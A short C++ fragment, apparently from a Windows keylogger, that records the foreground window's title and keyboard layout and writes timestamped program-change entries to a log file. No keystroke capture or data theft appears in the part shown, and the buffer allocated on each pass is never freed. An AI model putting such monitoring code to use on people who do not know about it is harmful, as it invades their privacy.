 if (foreground) {
        threadId = GetWindowThreadProcessId(foreground, NULL);
        keyboardLayout = GetKeyboardLayout(threadId);
        char *curProg = new char[BUFFER_SIZE];
        GetWindowTextA(foreground, curProg, BUFFER_SIZE);

        if (strcmp(curProg, prevProg) != 0) {
            strcpy_s(prevProg, curProg);
            __time64_t longtime;
            struct tm newtime;
            _time64(&longtime);
            _localtime64_s(&newtime, & longtime);
            char str_time[64];
            asctime_s(str_time, &newtime);
            file << "\n[Program: " << curProg << " DateTime: " << str_time << "]\n";
        }
    }